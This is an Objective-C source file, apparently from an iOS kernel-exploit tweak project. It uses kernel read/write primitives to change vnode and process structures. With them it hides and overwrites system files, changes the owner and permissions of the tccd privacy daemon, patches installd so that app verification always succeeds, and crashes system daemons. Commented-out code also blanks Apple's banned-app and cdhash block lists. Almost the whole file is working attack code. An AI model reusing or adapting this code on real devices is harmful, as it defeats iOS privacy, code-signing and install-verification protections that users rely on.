//        kwrite32(kfd, fileglob + off_fg_flag, O_ACCMODE);
//
//        printf("[i] %s to_vnode->v_writecount: %d\n", tofile, kread32(kfd, to_vnode + off_vnode_v_writecount));
//        kwrite32(kfd, to_vnode + off_vnode_v_writecount, kread32(kfd, to_vnode + off_vnode_v_writecount)+1);
//
//        // read from fromfile
//        //chatgpt moment
//        // Open the file in read mode
//        int second_file_index = open(fromfile, O_RDONLY);
//        if (second_file_index == -1) {
//            perror("Failed to open file in read mode");
//            return -1;
//        }
//
//        // Get the file size
//        off_t second_file_size = lseek(second_file_index, 0, SEEK_END);
//        if (second_file_size == -1) {
//            perror("Failed to determine file size");
//            close(second_file_index);
//            return -1;
//        }
//
//        // Move the file offset back to the beginning
//        if (lseek(second_file_index, 0, SEEK_SET) == -1) {
//            perror("Failed to seek to the beginning of the file");
//            close(second_file_index);
//            return -1;
//        }
//
//        // Allocate memory to hold the file contents
//        char* data = (char*)malloc(second_file_size);
//        if (!data) {
//            perror("Memory allocation failed");
//            close(file_index);
//            return -1;
//        }
//
//        // Read the contents of the file into the 'data' buffer
//        ssize_t bytes_read = read(second_file_index, data, second_file_size);
//        if (bytes_read == -1) {
//            perror("Failed to read file");
//            close(file_index);
//            free(data);
//            return -1;
//        }
//
//    // Close the file after reading
//        close(second_file_index);
//
////        const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
//
//        size_t data_len = strlen(data);
//
//        off_t file_size = lseek(file_index, 0, SEEK_END);
//        if (file_size == -1) {
//            perror("Failed lseek.");
//    //        close(file);
//    //        return;
//        }
//
//        char* mapped = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, file_index, 0);
//        if (mapped == MAP_FAILED) {
//            perror("Failed mmap.");
//    //        close(file);
//    //        return;
//        }
//
//        memcpy(mapped, data, data_len);
//
//        munmap(mapped, file_size);
//
//
//        kwrite32(kfd, to_v_mount + 0x70, to_m_flag);
//
//        close(file_index);
//        free(data);
//
//        return 0;
//    }



    uint64_t fun_ipc_entry_lookup(u64 kfd, mach_port_name_t port_name) {
        uint64_t proc = getProc(kfd, getpid());
        uint64_t proc_ro = kread64(kfd, proc + 0x18);
        
        uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
        printf("[i] self proc->proc_ro->pr_proc: 0x%llx\n", pr_proc);
        
        uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
        printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
        
        uint64_t itk_space_pac = kread64(kfd, pr_task + 0x300);
        uint64_t itk_space = itk_space_pac | 0xffffff8000000000;
        printf("[i] self task->itk_space: 0x%llx\n", itk_space);
        //NEED TO FIGURE OUR SMR POINTER!!!
        
    //    uint32_t table_size = kread32(kfd, itk_space + 0x14);
    //    printf("[i] self task->itk_space table_size: 0x%x\n", table_size);
    //    uint32_t port_index = MACH_PORT_INDEX(port_name);
    //    if (port_index >= table_size) {
    //        printf("[!] invalid port name: 0x%x", port_name);
    //        return -1;
    //    }
    //
    //    uint64_t is_table_pac = kread64(kfd, itk_space + 0x20);
    //    uint64_t is_table = is_table_pac | 0xffffff8000000000;
    //    printf("[i] self task->itk_space->is_table: 0x%llx\n", is_table);
    //    printf("[i] self task->itk_space->is_table read: 0x%llx\n", kread64(kfd, is_table));
    //
    //    const int sizeof_ipc_entry_t = 0x18;
    //    uint64_t ipc_entry = is_table + sizeof_ipc_entry_t * port_index;
    //    printf("[i] self task->itk_space->is_table->ipc_entry: 0x%llx\n", ipc_entry);
    //
    //    uint64_t ie_object = kread64(kfd, ipc_entry + 0x0);
    //    printf("[i] self task->itk_space->is_table->ipc_entry->ie_object: 0x%llx\n", ie_object);
    //
    //    sleep(1);
        
        
        return 0;
    }


//TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
//Current: Redirect /var -> NSHomeDirectory(), @"/Documents/mounted"
//void ls(u64 kfd, id path) {
////    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), path];
//    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
//    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
//    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
//    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/"); // redirect root from the mount path?
//    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"/var directory: %@", dirs);
//}

@import Darwin;
@import Foundation;
@import MachO;

#import <mach-o/fixup-chains.h>

#pragma mark wdbthreeapplimit
static uint64_t patchfind_get_padding(struct segment_command_64* segment) {
  struct section_64* section_array = ((void*)segment) + sizeof(struct segment_command_64);
  struct section_64* last_section = &section_array[segment->nsects - 1];
  return last_section->offset + last_section->size;
}

static bool patchfind_sections(void* executable_map,
                               struct segment_command_64** data_const_segment_out,
                               struct symtab_command** symtab_out,
                               struct dysymtab_command** dysymtab_out) {
  struct mach_header_64* executable_header = executable_map;
  struct load_command* load_command = executable_map + sizeof(struct mach_header_64);
  for (int load_command_index = 0; load_command_index < executable_header->ncmds;
       load_command_index++) {
    switch (load_command->cmd) {
      case LC_SEGMENT_64: {
        struct segment_command_64* segment = (struct segment_command_64*)load_command;
        if (strcmp(segment->segname, "__DATA_CONST") == 0) {
          *data_const_segment_out = segment;
        }
        break;
      }
      case LC_SYMTAB: {
        *symtab_out = (struct symtab_command*)load_command;
        break;
      }
      case LC_DYSYMTAB: {
        *dysymtab_out = (struct dysymtab_command*)load_command;
        break;
      }
    }
    load_command = ((void*)load_command) + load_command->cmdsize;
  }
  return true;
}

struct installd_remove_app_limit_offsets {
  uint64_t offset_objc_method_list_t_MIInstallableBundle;
  uint64_t offset_objc_class_rw_t_MIInstallableBundle_baseMethods;
  uint64_t offset_data_const_end_padding;
  // MIUninstallRecord::supportsSecureCoding
  uint64_t offset_return_true;
};

struct installd_remove_app_limit_offsets gAppLimitOffsets = {
    .offset_objc_method_list_t_MIInstallableBundle = 0x519b0,
    .offset_objc_class_rw_t_MIInstallableBundle_baseMethods = 0x804e8,
    .offset_data_const_end_padding = 0x79c38,
    .offset_return_true = 0x19860,
};

struct objc_method {
  int32_t name;
  int32_t types;
  int32_t imp;
};

struct objc_method_list {
  uint32_t entsizeAndFlags;
  uint32_t count;
  struct objc_method methods[];
};

static void patch_copy_objc_method_list(void* mutableBytes, uint64_t old_offset,
                                        uint64_t new_offset, uint64_t* out_copied_length,
                                        void (^callback)(const char* sel,
                                                         uint64_t* inout_function_pointer)) {
  struct objc_method_list* original_list = mutableBytes + old_offset;
  struct objc_method_list* new_list = mutableBytes + new_offset;
  *out_copied_length =
      sizeof(struct objc_method_list) + original_list->count * sizeof(struct objc_method);
  new_list->entsizeAndFlags = original_list->entsizeAndFlags;
  new_list->count = original_list->count;
  for (int method_index = 0; method_index < original_list->count; method_index++) {
    struct objc_method* method = &original_list->methods[method_index];
    // Relative pointers
    uint64_t name_file_offset = ((uint64_t)(&method->name)) - (uint64_t)mutableBytes + method->name;
    uint64_t types_file_offset =
        ((uint64_t)(&method->types)) - (uint64_t)mutableBytes + method->types;
    uint64_t imp_file_offset = ((uint64_t)(&method->imp)) - (uint64_t)mutableBytes + method->imp;
    const char* sel = mutableBytes + (*(uint64_t*)(mutableBytes + name_file_offset) & 0xffffffull);
    callback(sel, &imp_file_offset);

    struct objc_method* new_method = &new_list->methods[method_index];
    new_method->name = (int32_t)((int64_t)name_file_offset -
                                 (int64_t)((uint64_t)&new_method->name - (uint64_t)mutableBytes));
    new_method->types = (int32_t)((int64_t)types_file_offset -
                                  (int64_t)((uint64_t)&new_method->types - (uint64_t)mutableBytes));
    new_method->imp = (int32_t)((int64_t)imp_file_offset -
                                (int64_t)((uint64_t)&new_method->imp - (uint64_t)mutableBytes));
  }
};

static uint64_t patchfind_find_class_rw_t_baseMethods(void* executable_map,
                                                      size_t executable_length,
                                                      const char* needle) {
  void* str_offset = memmem(executable_map, executable_length, needle, strlen(needle) + 1);
  if (!str_offset) {
    return 0;
  }
  uint64_t str_file_offset = str_offset - executable_map;
  for (int i = 0; i < executable_length - 8; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + i);
    if ((val & 0xfffffffful) != str_file_offset) {
      continue;
    }
    // baseMethods
    if (*(uint64_t*)(executable_map + i + 8) != 0) {
      return i + 8;
    }
  }
  return 0;
}

static uint64_t patchfind_return_true(void* executable_map, size_t executable_length) {
  // mov w0, #1
  // ret
  static const char needle[] = {0x20, 0x00, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6};
  void* offset = memmem(executable_map, executable_length, needle, sizeof(needle));
  if (!offset) {
    return 0;
  }
  return offset - executable_map;
}

static bool patchfind_installd(void* executable_map, size_t executable_length,
                               struct installd_remove_app_limit_offsets* offsets) {
  struct segment_command_64* data_const_segment = nil;
  struct symtab_command* symtab_command = nil;
  struct dysymtab_command* dysymtab_command = nil;
  if (!patchfind_sections(executable_map, &data_const_segment, &symtab_command,
                          &dysymtab_command)) {
    printf("no sections\n");
    return false;
  }
  if ((offsets->offset_data_const_end_padding = patchfind_get_padding(data_const_segment)) == 0) {
    printf("no padding\n");
    return false;
  }
  if ((offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods =
           patchfind_find_class_rw_t_baseMethods(executable_map, executable_length,
                                                 "MIInstallableBundle")) == 0) {
    printf("no MIInstallableBundle class_rw_t\n");
    return false;
  }
  offsets->offset_objc_method_list_t_MIInstallableBundle =
      (*(uint64_t*)(executable_map +
                    offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods)) &
      0xffffffull;

  if ((offsets->offset_return_true = patchfind_return_true(executable_map, executable_length)) ==
      0) {
    printf("no return true\n");
    return false;
  }
  return true;
}

static NSData* make_patch_installd(void* executableMap, size_t executableLength) {
  struct installd_remove_app_limit_offsets offsets = {};
  if (!patchfind_installd(executableMap, executableLength, &offsets)) {
    return nil;
  }

  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
  char* mutableBytes = data.mutableBytes;
  uint64_t current_empty_space = offsets.offset_data_const_end_padding;
  uint64_t copied_size = 0;
  uint64_t new_method_list_offset = current_empty_space;
  patch_copy_objc_method_list(mutableBytes, offsets.offset_objc_method_list_t_MIInstallableBundle,
                              current_empty_space, &copied_size,
                              ^(const char* sel, uint64_t* inout_address) {
                                if (strcmp(sel, "performVerificationWithError:") != 0) {
                                  return;
                                }
                                *inout_address = offsets.offset_return_true;
                              });
  current_empty_space += copied_size;
  ((struct
    dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                          offsets
                                              .offset_objc_class_rw_t_MIInstallableBundle_baseMethods))
      ->target = new_method_list_offset;
  return data;
}

//bool patch_installd(kfd) {
//  const char* targetPath = "/usr/libexec/installd";
//  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
//  off_t targetLength = lseek(fd, 0, SEEK_END);
//  lseek(fd, 0, SEEK_SET);
//  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);
//
//  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
//  NSData* sourceData = make_patch_installd(targetMap, targetLength);
//  if (!sourceData) {
//    NSLog(@"can't patchfind");
//    return false;
//  }
//
//  if (!funVnodeOverwriteFile(kfd, fd, sourceData)) {
//    funVnodeOverwriteFile(kfd, fd, originalData);
//    munmap(targetMap, targetLength);
//    NSLog(@"can't overwrite");
//    return false;
//  }
//  munmap(targetMap, targetLength);
//  xpc_crasher("com.apple.mobile.installd");
//  sleep(1);
//
//  // TODO(zhuowei): for now we revert it once installd starts
//  // so the change will only last until when this installd exits
//  funVnodeOverwriteFile(kfd, fd, originalData);
//  return true;
//}

//#include <sys/mman.h>
//
//bool patch_installd(int kfd) {
//    const char* targetPath = "/usr/libexec/installd";
//    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
//    off_t targetLength = lseek(fd, 0, SEEK_END);
//    lseek(fd, 0, SEEK_SET);
//
//    // Use funVnodeResearch2 to patch the target file
//    if (funVnodeResearch2(kfd, targetPath) != 0) {
//        NSLog(@"Failed to patch %s", targetPath);
//        close(fd);
//        return false;
//    }
//
//    // Wait for some time before reverting the changes
//    sleep(1);
//
//    // TODO(zhuowei): for now, we revert it once installd starts
//    // so the change will only last until when this installd exits
//    int fd_revert = open(targetPath, O_WRONLY | O_CLOEXEC);
//    if (fd_revert >= 0) {
//        // Write the original data back to the file
//        write(fd_revert, targetMap, targetLength);
//        close(fd_revert);
//    }
//
//    close(fd);
//
//    return true;
//}

void hide_lsicons(u64 kfd) {
    printf("hiding lockscreen icons\n");
    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/CoverSheet.framework/Assets.car");
}

void hide_darkmode_dock(u64 kfd) {
    printf("hiding darkmode dock background\n");
    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/CoreMaterial.framework/dockDark.materialrecipe");
}

void hide_lightmode_dock(u64 kfd) {
    printf("hiding lightmode dock background\n");
    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/CoreMaterial.framework/dockLight.materialrecipe");
}

void hide_homebar(u64 kfd) {
    printf("hiding home bar\n");
    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/MaterialKit.framework/Assets.car");
}

#pragma mark main function
int do_fun(u64 kfd) {
    printf("hiding home bar\n");
    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/MaterialKit.framework/Assets.car");
    printf("hiding dock background\n");
    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/CoreMaterial.framework/dockDark.materialrecipe");
    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/CoreMaterial.framework/dockLight.materialrecipe");
    printf("hiding lockicons\n");
    funVnodeHide(kfd, "/System/Library/PrivateFrameworks/CoverSheet.framework/Assets.car");
//    funVnodeOverwrite(kfd, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png"); // replace destination from targeted
//    funCSFlags(kfd, "launchd");
//    funTask(kfd, "kfd");
    
    print("[i] chowning tccd to user NOW\n\n");
    //Patch
    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);

    print("[i] chowning tccd to root NOW\n\n");
    //Restore
    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);

    print("[i] chmodding tccd to 777 NOW\n\n");
    //Patch
    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);

    print("[i] chmodding tccd to 755 NOW\n\n");
    //Restore
    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
    
    
    // vnoderesearch2
    mach_port_t host_self = mach_host_self();
    printf("[i] mach_host_self: 0x%x\n", host_self);
    fun_ipc_entry_lookup(kfd, host_self);

    NSString *path = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/abcd.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    [@"Hello, this is an example file!" writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];

        //NEW WAY, open with O_RDONLY AND PATCH TO O_RDWR, Actually we don't need to use funVnodeChown, funVndeChmod.
    //    funVnodeChown(kfd, "/System/Library/CoreServices/SystemVersion.plist", 501, 501);
    //    funVnodeChmod(kfd, "/System/Library/CoreServices/SystemVersion.plist", 0107777);
//        funVnodeResearch2(kfd, "/System/Library/Audio/UISounds/photoShutter.caf");
    
    
    
    //    NSString *AAAApath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/AAAA.bin"];
    //    remove(AAAApath.UTF8String);
    //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:AAAApath error:nil];
    //
    //    NSString *BBBBpath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/BBBB.bin"];
    //    remove(BBBBpath.UTF8String);
    //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:BBBBpath error:nil];
        
        
    //    funVnodeOverwriteFile(kfd, mntPath.UTF8String, "/var/mobile/Library/Caches/com.apple.keyboards");
    //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/AAAA.bin"] toPath:[NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted/images/BBBB.bin"] error:nil];
        
    //    symlink("/System/Library/PrivateFrameworks/TCC.framework/Support/", [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/Support"].UTF8String);
    //    mount("/System/Library/PrivateFrameworks/TCC.framework/Support/", mntPath, NULL, MS_BIND | MS_REC, NULL);
    //    printf("mount ret: %d\n", mount("apfs", mntpath, 0, &mntargs))
    //    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 501, 501);
    //    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/", 0107777);


    //    funVnodeOverwriteFile(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", AAAApath.UTF8String);
    //    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
    //    funVnodeOverwriteFile(kfd, AAAApath.UTF8String, BBBBpath.UTF8String);
    //    funVnodeOverwriteFile(kfd, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
        
    //    xpc_crasher("com.apple.tccd");
    //    xpc_crasher("com.apple.tccd");
    //    sleep(10);
    //    funUcred(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
    //    funProc(kfd, getProc(kfd, getPidByName(kfd, "tccd")));
    //    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
        
        
    //    funVnodeOverwrite(kfd, AAAApath.UTF8String, AAAApath.UTF8String);
        
    
    
    
    //vnoderesearch v1
    //    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", copyToAppDocs.UTF8String);
    //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var
//    NSString *mntPath = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/mounted"];
//    [[NSFileManager defaultManager] removeItemAtPath:mntPath error:nil];
//    [[NSFileManager defaultManager] createDirectoryAtPath:mntPath withIntermediateDirectories:NO attributes:nil error:nil];
//    funVnodeRedirectFolder(kfd, mntPath.UTF8String, "/");
//    NSArray* dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"/var directory: %@", dirs);
    
    //TODO: Redirect /System/Library/PrivateFrameworks/TCC.framework/Support/ -> NSHomeDirectory(), @"/Documents/mounted"
    
    //Redirect Folders: NSHomeDirectory() + @"/Documents/mounted" -> /var/mobile
//    funVnodeResearch(kfd, mntPath.UTF8String, mntPath.UTF8String);
//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"[i] /var/mobile dirs: %@", dirs);
//    [@"여자친구 생기게 해주세요!@#" writeToFile:[mntPath stringByAppendingString:@"/kfd.txt"] atomically:YES encoding:NSUTF8StringEncoding error:nil];
//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"[i] Created /var/mobile/kfd.txt,  dirs: %@", dirs);
//
//    NSError *error;
//    BOOL removeSuccess = [[NSFileManager defaultManager] removeItemAtPath:[mntPath stringByAppendingString:@"/kfd.txt"] error:NULL];
//    if (!removeSuccess) {
//        NSLog(@"Error removing file at path: %@", error.localizedDescription);
//    };
//    dirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:mntPath error:NULL];
//    NSLog(@"[i] Removed /var/mobile/kfd.txt, dirs: %@", dirs);
    
    
//    funVnodeOverwrite2(kfd, "/System/Library/Audio/UISounds/lock.caf", "/System/Library/Audio/UISounds/connect_power.caf"); // too large size
    
    funVnodeOverwrite2(kfd, "/System/Library/Audio/UISounds/lock.caf", "/System/Library/Audio/UISounds/key_press_click.caf"); // same partition, test if that's the issue
    
    funVnodeOverwrite2(kfd, "/System/Library/PrivateFrameworks/FocusUI.framework/dnd_cg_02.ca/main.caml", "/System/Library/ControlCenter/Bundles/LowPowerModule.bundle/LowPower.ca/main.caml"); // both System files
    
//    funVnodeOverwrite2(kfd, "/System/Library/Audio/UISounds/lock.caf", "/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/vineboom.caf");
    
//    funVnodeOverwrite2(kfd, "/System/Library/PrivateFrameworks/FocusUI.framework/dnd_cg_02.ca/main.caml", "/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/caml/focusmain.caml");
    
    funVnodeOverwrite2(kfd, "/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/caml/mainvolume.caml", "/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/caml/lpmmain.caml"); // both var. if these 3 all return 5, means that partitions are an issue
    
//    funVnodeOverwrite2(kfd, "/System/Library/ControlCenter/Bundles/LowPowerModule.bundle/LowPower.ca/main.caml", "/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/caml/lpmmain.caml");
////
//    funVnodeOverwrite2(kfd, "/System/Library/PrivateFrameworks/MediaControls.framework/Volume.ca/main.caml", "/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/caml/mainvolume.caml");
////
//    funVnodeOverwrite2(kfd, "/System/Library/ControlCenter/Bundles/ConnectivityModule.bundle/Bluetooth.ca/main.caml", "/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/caml/mainbluetooth.caml");
//
//
//    funVnodeOverwriteFile(kfd, "/System/Library/Audio/UISounds/photoShutter.caf", "/System/Library/Audio/UISounds/lock.caf"); // DC4597C3-66C4-4717-BC0F-CE9E3937F490

    //Overwrite tccd:
    //    NSString *copyToAppDocs = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/tccd_patched.bin"];
    //    remove(copyToAppDocs.UTF8String);
    //    [[NSFileManager defaultManager] copyItemAtPath:[NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/tccd_patched.bin"] toPath:copyToAppDocs error:nil];
    //    chmod(copyToAppDocs.UTF8String, 0755);
    //    funVnodeOverwrite(kfd, selfProc, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", [copyToAppDocs UTF8String]);
        
    //    xpc_crasher("com.apple.tccd");
    //    xpc_crasher("com.apple.tccd");

//    func overwriteBlacklist() -> Bool {
//        return overwriteFileWithDataImpl(originPath: "/private/var/db/MobileIdentityData/Rejections.plist", replacementData: try! Data(base64Encoded: blankplist)!)
//    }
//
//    func overwriteBannedApps() -> Bool {
//        return overwriteFileWithDataImpl(originPath: "/private/var/db/MobileIdentityData/AuthListBannedUpps.plist", replacementData: try! Data(base64Encoded: blankplist)!)
//    }
//
//    func overwriteCdHashes() -> Bool {
//        return overwriteFileWithDataImpl(originPath: "/private/var/db/MobileIdentityData/AuthListBannedCdHashes.plist", replacementData: try! Data(base64Encoded: blankplist)!)
//    } let blankplist = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdC8+CjwvcGxpc3Q+Cg=="
    print("done!!!\n");
    return 0;
}
